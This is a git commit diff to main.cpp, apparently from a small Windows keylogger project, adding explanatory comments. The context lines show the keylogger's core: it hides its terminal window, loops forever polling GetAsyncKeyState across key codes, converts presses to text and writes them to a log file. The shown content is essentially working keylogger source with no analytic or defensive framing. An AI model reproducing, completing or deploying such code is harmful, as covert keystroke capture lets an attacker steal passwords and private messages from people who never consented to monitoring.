854c9493e846db56c6e23ff9a9ac87fd8d3884fa
DanSabau21 <dan.sabau.dev21@gmail.com>
2022-08-24 17:07:33 +0300

    added comments

--- main.cpp
+++ main.cpp
@@ -5,12 +5,16 @@
 #define PRESSED_KEY_CODE -32767
 
 int main() {
+    // hide the terminal
     utils::hide_terminal();
 
     while (true) {
+        // checking the key_codes
         for (int key_code = 8; key_code <= 190; ++key_code) {
+            // if the key has been pressed
             if (PRESSED_KEY_CODE == GetAsyncKeyState(key_code)) {
                 std::string data;
+                // check if it is a special key code
                 if (utils::is_special_char(key_code)) {
                     data = utils::translate_special_key_int_to_string(key_code);
                 } else {
@@ -20,6 +24,8 @@ int main() {
                         data = std::string(1, (char) std::tolower(key_code));
                     }
                 }
+
+                // save it in the logging file
                 utils::save_log_data(data);
             }
         }
